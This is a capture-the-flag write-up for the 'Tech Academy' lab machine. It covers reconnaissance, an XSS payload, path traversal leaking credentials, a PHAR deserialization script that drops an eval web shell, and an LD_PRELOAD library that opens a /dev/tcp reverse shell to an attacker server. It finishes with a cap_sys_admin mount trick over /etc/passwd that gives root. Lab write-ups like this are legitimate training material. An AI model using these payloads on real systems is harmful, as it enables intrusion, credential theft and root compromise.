[Hacking Club](https://app.hackingclub.com/laboratory/competition-machines/310)

Tech Academy is a platform focused in programming. It’s important to understand the flow and how we’ll analyze a opportunity to explore vulnerabilities.


![Tech Academy](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/900kfoi0b4uspfu2p95k.png)


## 1. Reconnaissance (Information Gathering)

The first step is always recon, so how I can try a fuzzing, if I don’t understand what I’m doing here?

First, the operational system is Ubuntu, web server is nginx and programming language is PHP because PHP has a standard name to session cookie: `PHPSESSID` and Node.js because of framework Express.


![Wappalyzer - Part 1](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/5z9i1xp68f3bogos25j9.png)


![Wappalyzer - Part 2](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/mjn5zje378ef5ii7igf2.png)



![Endpoints - techacademy.hc](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/vavw6zia7ugk01oh7edc.png)


![Endpoints - certificated.techacademy.hc](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/8uz0n6xkqu1m9fpeibd1.png)


### 1.1. nmap

After that, it’s important to see how many doors are there and what we can do with this information about our target

```jsx
nmap -Pn -sV -A IP -v
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0e:f5:4e:66:f4:10:d6:94:36:fd:73:26:56:61:ca:f2 (ECDSA)
|_  256 cb:00:6c:79:84:02:84:1c:b4:a0:f0:5b:c8:8d:8f:da (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: In\xC3\xADcio - Tech Academy
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.24.0 (Ubuntu)
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
Uptime guess: 24.060 days (since Sat Jan 10 18:34:50 2026)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=262 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Basically, two ports open: 22 (SSH) and 80 (HTTP), a relatively up-to-date server.

### 2. DOM-based Stored XSS

The endpoint `/js/auth.js` has a interesting vulnerability at register function:


![auth.js](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/5gqjtg1s5m2a7usjwgma.png)



```jsx
function updateNavigation(user) {

  if (user) {
    
    userMenu.innerHTML = `
      <div ...>
        ...
          <span style="font-weight: 500;">${user.name}</span>
        ...
      </div>
    `;
    navLinks.appendChild(userMenu);
  }
```

The `updateNavigation` is a bridge to a XSS because of `innerHTML,`  . Then, the code catch `user.name` that come from localStorage a reply from server, and inject directly in HTML.

So I tried the classic payload when we register a name with payload XSS:

```jsx
<img src=x onerror=alert(document.cookie)>
```


![Personal Information](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/8znr214zbdlzt5n4mhtu.png)


![XSS](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/hfn5xhhaejizelvup005.png)

But, the XSS doesn’t take us to a real point. Then, it’s insufficient for me to go to the flags. The exploration continues.

## 3. Web Exploration (Server-Side)

### 3.1. LFI at certificated.techacademy.hc

A classic vulnerability of Path Traversal is part of our point to success. In this case, `/certified` endpoint accept a parameter named file and the file return important informations. Indeed, backend don’t do a good sanitization. To be specific, we can try a sequence to up the directories and file access out of uploads folders.


![Download Certificate](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/c9m8mxo9rgreilofb48k.jpeg)



![file endpoint](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/yyc0h74w4xe8f9v71wva.jpeg)


![/etc/passwd](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/j57p6s4t8ts6u6rg6vau.jpeg)

![config.php](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/nh33tddkxhbr01nv7miv.jpeg)
/var/www/certificated/app/helpers/config.php


Wow, I found `Shanah` user and your password… but it’s a hard lab, it’s nothing something easy to access. When I try to ingress ssh, our entry is denied because of public key.


![SSH](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/0llxxj0u3nvxsgmgis4r.jpeg)



### 3.2. File Upload Bypass

When I was browsing, something interesting happened when I changed my profile picture. Node.js API valid a file extension, but not the content.  If I use a PHP web shell with LFI using a malicious photo?


![perfil](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/it0rzg6zq4b523levpte.jpeg)

![profile](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/riihrzccyy7ly5d12rkg.jpeg)


![New photo](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/h3i6vorpcvcca32tchhq.png)


It’s moment to create a PHP Webshell, rename for .jpg (to pass node.js) and use LFI (on PHP) to execute the .jpg with code.

### 3.3. Phar Deserialization

### 3.3.1. Script and obfuscation

To obtain a remote code execution (RCE), we need PHAR (PHP Archive)  deserialization that allows an attacker to execute arbitrary code. Only LFI vulnerabilty isn’t enough, because we have upload restrictions, like Node.js middleware that block php files, but allow jpg images. Another point, it’s the wrappers from php stream like phar://  automatically deserialize  file metadata when accessed by file system functions (ex: `file_existis`, `fopen`, `include`). Third, we identified the app\controller\Certificated class in the backend. This class acts like a Gadget, with a magic method (`__destruct`)that write object properties in disk.

1. This script below generate a malicious Phar (PHP Archive) file disguised like a image, containing a deserialize object (payload) prepared for explorer a deserialization failure on the server.

```php
<?php
namespace app\controller {
    class Certificated {
        public $data;
        public $file;
    }
}

namespace {
    $phar = new Phar('exploit.phar');
    $phar->startBuffering();
    $phar->addFromString('test.txt', 'test');
    $phar->setStub("<?php __HALT_COMPILER(); ?>");

    $payload = new \app\controller\Certificated();
    

    $payload->file = '/var/www/certificated/public/shell.php';
    
    
    $payload->data = '<?php eval($_GET["c"]); ?>';

    $phar->setMetadata($payload);
    $phar->stopBuffering();

    rename('exploit.phar', 'exploit.jpg');

    echo "exploit.jpg file successfully created!\n";
}
```

1. Run the script.

```php
php -d phar.readonly=0 ./Downloads/exploit.php 
exploit.jpg file successfully create!

```

1. The Node.js server save at `/var/www/main/public/uploads/profile-[numbers]-[numbers].jpg`


![saving](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/baaoe0wwgkphbuvpoaqj.png)



1. Testing if the upload worked using LFI vulnerability that was found:

```php
http://certificated.techacademy.hc/certified?file=phar:///var/www/main/public/uploads/profile-1770488009671-280225128.jpg/test.txt
```


![Phar](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/g3opoeuo8mxptivhopri.png)



### 3.4. Webshell

We access the `shell.php` file newly created. But, attempts to `cmd=id` or `cmd=ls` failed because the `php.ini` blocking `system`, `shell_exec`, etc.


![shell.php](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/85shcuywx33i2o4mpegq.jpeg)

Now, we need to bypass PHP `disable_functions` and generate a reverse shell. I’ll use `LD_PRELOAD`.

### 3.4.1. Bypass PHP disable_functions and reverse shell

First of all, disable_functions is a PHP directive in `php.ini` configuration file that allows system admin to disable specific functions for security reasons. For example: `exec`, `shell_exec`, `system`, etc. Secondly, `LD_PRELOAD` is used by attackers to bypass these restrictions because it allows to load a custom, malicious shared library (.so file) before standard system libraries. In this case, `LD_PRELOAD`’ll be used with `mail()` function.

1. First, we need to compile the code below (`hack.c`):

```php
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

void __attribute__((constructor)) initLibrary(void) {
    unsetenv("LD_PRELOAD");

    system("/bin/bash -c '/bin/bash -i >& /dev/tcp/IP/PORT 0>&1'");
}
```

2. Compiling with `gcc`:

```php
gcc -shared -fPIC hack.c -o hack.so
```

3. Now we need to send our malicious lib `hack.so` to victim web server. First, we’re a attacker and need to transfer our malicious file using HTTP server in our terminal.

```php
sudo python3 -m http.server 80
```

4. Victim (via Web shell):

```php
http://certificated.techacademy.hc/shell.php?c=copy('http://10.0.22.155/hack.so', '/tmp/hack.so');

```

![copy](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/59o8xbecqgvuhno48egj.jpeg)

After this, if we see our `http.server`, our exploit was sent to the victim server:

```bash
sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
172.16.13.174 - - [07/Feb/2026 17:52:45] "GET /hack.so HTTP/1.0" 200 -
```

1. Triggering the exploit:
    1. Our terminal:
    
    ```bash
    nc -lvnp 8000
    ```
    
    b. Victim:
    
    ```bash
    http://certificated.techacademy.hc/shell.php?c=putenv('LD_PRELOAD=/tmp/hack.so'); mail('a','a','a','a');
    ```
    


![LD_PRELOAD](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/ce7tfrppvfdritpsddk5.jpeg)


Result: a interactive reverse shell:


![Reverse shell](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/wsxggct3luek8qq7jmej.png)



## 4. Stabilizing shell and lateral movement

It’s important to stabilizing your shell, because any slip will kill our connection and commands like `su` and `nano` don’t work well in dumb shells.

1. First step: `TTY Spawn`

The first command that we need to write is:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

1. Second step: `Magic Stty`

Now we need to enable the `CTRL+C`, autocomplete (Tab) and historical.

1. `CTRL+C` key combination
2. In our terminal, we type:

```bash
stty raw -echo; fg
```

When we press enter, it may seem like locked. Type `reset` and press Enter or `xterm` if appears: Terminal type?

1. Environment variable

To ensure that commands like clear and text editor work:

```bash
export TERM=xterm
export SHELL=bash
```

Now it’s time to lateral movement, remember `Shanah`? it’s our front door now:

```bash
su Shanah
Password:
```

![user.txt](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/enp42flciqkdfepbd2ie.jpeg)



Uou, our first flag is here in `user.txt`.

## 5. Privilege Escalation

The hard part is over when we tried to take our initial access, for privilege escalation we’ll use linux command-line `getcap` used to examine, list and display the file capabilities assigned to executable files.

```bash
getcap -r / 2>/dev/null
/usr/bin/mtr-packet cap_net_raw=ep
/usr/bin/ping cap_net_raw=ep
/usr/local/bin/python3_cap cap_sys_admin=ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin,cap_sys_nice=ep
/usr/lib/snapd/snap-confine cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_setgid,cap_setuid,cap_sys_chroot,cap_sys_ptrace,cap_sys_admin=p
/snap/core22/2133/usr/bin/ping cap_net_raw=ep
/snap/snapd/25202/usr/lib/snapd/snap-confine cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_sys_chroot,cap_sys_ptrace,cap_sys_admin=p
/snap/snapd/25935/usr/lib/snapd/snap-confine cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_setgid,cap_setuid,cap_sys_chroot,cap_sys_ptrace,cap_sys_admin=p
```

The capability `cap_sys_admin=ep` is our door to privilege escalation

How we don’t have permission to edit `/etc/passwd` we use the privilege python to mount a false file on top of the real file.

### 5.1. Exploration script

1. Using Copy and paste (Heredoc)
    
    This method use a cat command to read everything that you paste until the key word `EOF`
    

```bash
cat <<EOF > /tmp/exploit.py
import ctypes
import os

libc = ctypes.CDLL('libc.so.6')

# Define caminhos (em bytes)
source = b'/tmp/passwd_fake'
target = b'/etc/passwd'

print(" Replacing /etc/passwd...")
try:
    libc.mount(source, target, None, 4096, None)
    print("Becoming root")
    os.system("su r00t")
except Exception as e:
    print(f"[-] Erro: {e}")
EOF
```

Verify if `/tmp/passwd_fake` exist. If not, we can create a fake file (original copy + root user)

```bash
cp /etc/passwd /tmp/passwd_fake
echo 'r00t::0:0:root:/root:/bin/bash' >> /tmp/passwd_fake
 cat /tmp/passwd_fake
root:x:0:0:root:/root:/bin/bash
...
r00t::0:0:root:/root:/bin/bash

```

Make sure that `passwd_fake` was created:

```bash
$ ls -la /tmp/passwd_fake
-rw-r--r-- 1 Shanah Shanah 2073 Feb  7 22:07 /tmp/passwd_fake
```

Triggering the exploit:

```bash
/usr/local/bin/python3_cap /tmp/exploit.py
```

## 6. Root flag and conclusion

Congratulations to us, now we are root too.


![R0ot.txt](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/rjhk7jxi9kqeesbu18xw.jpeg)

It’s my first text in English with a lot of mistakes, but I hope someone liked it. See you later guys!